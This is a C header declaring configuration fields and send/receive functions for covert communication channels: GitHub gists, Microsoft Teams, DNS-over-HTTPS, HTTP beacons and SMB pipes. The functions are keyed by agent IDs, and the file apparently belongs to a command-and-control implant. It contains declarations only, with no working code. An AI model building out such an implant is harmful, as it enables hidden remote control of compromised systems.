#ifndef CHANNELS_H
#define CHANNELS_H

#include <stddef.h>

#define CHANNEL_OK     0
#define CHANNEL_ERR   -1
#define CHANNEL_RETRY -2

typedef struct {
    char github_token[256];
    char gist_cmd_id[64];
    char gist_out_id[64];

    char teams_tenant_id[64];
    char teams_client_id[64];
    char teams_client_secret[256];
    char teams_webhook_url[512];
    char teams_team_id[64];
    char teams_channel_id[64];

    char doh_server[256];
    char doh_domain[128];

    char beacon_url[512];
    char http_useragent[512];
    char http_extra_headers[1024];
    char http_cert_pin[65];

    char smb_host[256];
    char smb_pipe[128];
} channel_config_t;

void channel_config_init(channel_config_t *cfg);

int   github_send(const channel_config_t *cfg, const char *agent_id, const char *b64);
char *github_recv(const channel_config_t *cfg, const char *agent_id);

int   teams_send(const channel_config_t *cfg, const char *agent_id, const char *b64);
char *teams_recv(const channel_config_t *cfg, const char *agent_id);

int   doh_send(const channel_config_t *cfg, const char *agent_id, const char *b64);
char *doh_recv(const channel_config_t *cfg, const char *agent_id);

int   http_send(const channel_config_t *cfg, const char *agent_id, const char *b64);
char *http_recv(void);

int   smb_send(const channel_config_t *cfg, const char *agent_id, const char *b64);
char *smb_recv(void);

int   channel_send(const channel_config_t *cfg, const char *agent_id, const char *b64);
char *channel_recv(const channel_config_t *cfg, const char *agent_id);

#endif /* CHANNELS_H */
